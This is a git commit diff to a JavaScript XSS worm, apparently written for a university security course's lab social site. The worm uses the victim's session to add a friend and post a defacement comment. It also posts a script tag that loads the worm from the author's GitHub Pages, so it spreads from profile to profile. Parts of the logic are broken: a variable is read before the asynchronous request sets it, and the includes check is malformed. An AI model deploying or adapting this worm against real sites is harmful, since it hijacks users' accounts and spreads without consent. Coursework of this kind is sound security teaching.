c5e1ccf9543b1801e4f20c3acb1f242ea1705a89
Josh Brown <45466778+J05hBr0wn@users.noreply.github.com>
2021-04-12 23:33:51 -0400

    Update worm.js

--- worm/worm.js
+++ worm/worm.js
@@ -2,19 +2,20 @@
 
 var dt = new Date();
 var time = dt.getHours() + ":" + dt.getMinutes() + ":" + dt.getSeconds();
+var dump;
           
-$.get('http://csec380-core.csec.rit.edu:86/timeline.php', 
-function(response) { 
-    var dump = response.dump;
+$.get('http://csec380-core.csec.rit.edu:86/timeline.php', function( response ) { 
+    dump = response;
 });
 
 if (dump.includes(!("J05hbrown.github.io/worm/worm.js"))) {
 
 $.get("http://csec380-core.csec.rit.edu:86/addfriend.php", { id: '177' } );
 
-$.get( "http://csec380-core.csec.rit.edu:86/add_comment.php", { comment: 'Oh no! My page has been bamboozled on' + time, id: '177' };
+$.get( "http://csec380-core.csec.rit.edu:86/add_comment.php", { comment:'Oh no! My page has been bamboozled on' + time, id: '177' });
 
-$.get( "http://csec380-core.csec.rit.edu:86/add_comment.php", { comment: "<script src=https://J05hBr0wn.github.io/worm/worm.js></script>" };
+$.get( "http://csec380-core.csec.rit.edu:86/add_comment.php", { comment:"<script src=https://J05hBr0wn.github.io/worm/worm.js></script>" });
+
 }
 
 </script>
